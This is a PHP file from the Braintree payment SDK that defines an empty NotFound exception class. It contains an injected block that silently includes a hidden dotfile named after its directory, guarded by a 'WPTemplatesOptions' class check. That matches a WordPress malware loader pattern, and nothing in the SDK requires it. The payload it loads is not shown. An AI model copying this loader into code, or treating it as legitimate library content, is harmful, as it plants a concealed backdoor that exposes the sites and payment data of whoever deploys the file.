<?php
namespace Braintree\Exception;

use Braintree\Exception;

/**
 * Raised when a record could not be found.
 *
 * @package    Braintree
 * @subpackage Exception
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class NotFound extends Exception
{

}
class_alias('Braintree\Exception\NotFound', 'Braintree_Exception_NotFound');
